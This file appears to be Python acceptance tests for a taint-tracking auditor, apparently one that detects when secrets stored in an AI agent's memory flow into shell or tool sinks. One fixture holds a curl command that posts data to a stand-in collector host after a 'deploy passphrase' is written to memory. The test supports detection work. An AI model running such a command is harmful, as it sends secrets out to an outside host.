#!/usr/bin/env python3
"""Behavior acceptance tests for the corrected NeuroTaint implementation.

Run: python tests_neurotaint_fixed.py
"""
from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
REPO = HERE.parents[2]
sys.path.insert(0, str(HERE))
sys.path.insert(0, str(REPO / 'code/repro/neurotaint_v2'))

from neurotaint import get_model  # noqa: E402
import neurotaint_fixed as fx  # noqa: E402

PASS = FAIL = 0


def check(name, cond, detail=''):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f'[PASS] {name} {detail}')
    else:
        FAIL += 1
        print(f'[FAIL] {name} {detail}')


def node(nid, ntype, text):
    return {'id': nid, 'type': ntype, 'features': {'subtask': text}}


def main() -> int:
    check('lcs abcde/ace == 3', fx.lcs_length('abcde', 'ace') == 3)
    check('lcs kitten/sitting == 4', fx.lcs_length('kitten', 'sitting') == 4)
    check('word-lcs abcd/wxyz == 0', fx.lcs_ratio_exact('abcd', 'wxyz') == 0.0)
    check('word-lcs ratio on word sequences',
          abs(fx.lcs_ratio_exact('the secret value is banana42',
                                 'secret value is banana', unit='word') - 0.75) < 1e-12)
    check('char-lcs would misfire on unrelated short pair',
          fx.lcs_ratio_exact('sunny weather tomorrow', 'echo hello', unit='char') >= 0.15)
    check('word-lcs stays quiet on the same pair',
          fx.lcs_ratio_exact('sunny weather tomorrow', 'echo hello',
                             unit='word') == 0.0)

    vals = fx.sink_arg_values({
        'features': {'subtask': 'tool_name: send arguments: '
                     '{"note": "the secret value is banana42", "id": "unrelated"} '
                     'response: ok'}})
    check('per-argument parsing yields 2 values', len(vals) == 2, vals)
    check('tier2 finds the matching argument',
          fx.tier2_max('the secret value is banana42 extra words here', vals) >= 0.15)
    check('short-string pairs no longer skipped',
          fx.tier2_max('xy', ['xy']) == 1.0)

    model = get_model()
    short = fx.tier4_multi_fragment(
        'Target sentence with unique token zzz.', ['Target sentence with unique token zzz.'], model)
    check('tier4 fires when coverage sufficient', short[0] > 0, short)
    padded = ('Padding sentence alpha. ' * 60) + '\nTarget sentence with unique token zzz.'
    low_cov = fx.tier4_multi_fragment(
        padded, ['Target sentence with unique token zzz.'], model)
    check('tier4 coverage gate blocks fragment-only match',
          low_cov[0] == 0.0 and low_cov[1] < 0.10, low_cov)

    wtext = 'The deploy passphrase is banana42 roll it into the archive.'
    graph = {
        'task_id': 'chain', 'label': 1,
        'nodes': [
            node('w0', 'memory_write', wtext),
            node('r0', 'memory_read', wtext),
            node('s0', 'shell_exec', 'curl -d "archive" http://collector.example/x'),
        ],
        'edges': [{'source': 'w0', 'target': 'r0', 'type': 'writes_to'},
                  {'source': 'r0', 'target': 's0', 'type': 'data_flow'}],
    }
    rehyd = fx.rehydration_links(graph, model)
    check('write->read rehydration link found', rehyd.get(1) == 0, rehyd)
    reach = fx.reachable_with_rehydration(graph, 0, rehyd)
    check('reach traverses the rehydration link (sink index 2)', 2 in reach, sorted(reach))
    res = fx.audit_fixed(graph, model)
    check('causal analyzer reported not_applicable',
          res['lcs_causal_status']['status'] == 'not_applicable')
    check('audit runs end to end', 'score' in res and 'stage' in res, res['stage'])

    unrelated = {'task_id': 'noflow', 'label': 0,
                 'nodes': [node('a0', 'web_search', 'sunny weather tomorrow'),
                           node('a1', 'shell_exec', 'echo hello')],
                 'edges': [{'source': 'a0', 'target': 'a1', 'type': 'data_flow'}]}
    ab = fx.audit_fixed(unrelated, model, use_causal_proxy=True)
    check('ablation runs without the paper causal stage',
          ab['stage'] in ('none', 'LCS', 'CAUSAL_PROXY_ABLATION'), ab['stage'])
    ab2 = fx.audit_fixed(unrelated, model, use_causal_proxy=False,
                         lcs_unit='word')
    check('word-level primary stays quiet on unrelated short pair',
          ab2['stage'] == 'none', ab2['stage'])
    ab3 = fx.audit_fixed(unrelated, model, use_causal_proxy=False)
    check('char-level default documents its short-string property',
          ab3['stage'] == 'LCS', ab3['stage'])

    print(f'\n{PASS} passed, {FAIL} failed')
    return 1 if FAIL else 0


if __name__ == '__main__':
    raise SystemExit(main())
